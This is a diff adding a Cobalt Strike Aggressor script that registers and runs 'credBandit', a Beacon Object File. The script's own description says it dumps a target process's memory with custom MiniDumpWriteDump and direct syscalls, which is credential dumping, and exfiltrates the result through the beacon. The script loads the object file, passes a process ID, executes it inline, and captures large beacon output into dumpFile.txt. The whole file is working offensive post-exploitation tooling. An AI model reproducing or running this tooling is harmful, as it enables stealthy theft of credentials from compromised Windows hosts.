@@ -1,0 +1,56 @@
+#Register command
+beacon_command_register(
+"credBandit", 
+"runs an all in memory custom MiniDumpWriteDump implementation using static x64 syscalls and exfiltrates the data back through your beacon or can write to disk.", 
+"Synopsis: credBandit [targit PID]");
+alias credBandit {
+    local('$barch $handle $data $args');
+    
+    # figure out the arch of this session
+    $barch  = barch($1);
+    
+    # read in the right BOF file
+    $handle = openf(script_resource("credBandit $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    if(size(@_) < 2)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("credBandit"));
+        return;
+    }
+	
+    # pack our arguments
+    $args = bof_pack($1, "iz", $2, $3);
+
+    # announce what we're doing 
+    btask($1, "Running credBandit by (@anthemtotheego)");
+
+    # execute it.
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+
+#Grab output and write to file
+set BEACON_OUTPUT {
+	local('$handle');
+
+	$length = strlen($2);
+
+	if ( $length > 100 ) {
+
+		$handle = openf(">> dumpFile.txt");
+		writeb($handle, $2);
+		closef($handle);
+	} 
+	#else if ( $length = 18 ) {# Leaving this here if you want to try and add automation of the cleanup script
+	
+	#	exec(script_resource("./cleanupMiniDump.sh"));
+	#	return "\c9[+]\o " . replace($2, "([a-z]):\n", "\$1\cE:\n\o", 1);
+	#}
+	else {
+		return "\c9[+]\o " . replace($2, "([a-z]):\n", "\$1\cE:\n\o", 1);
+	};
+}
+
+
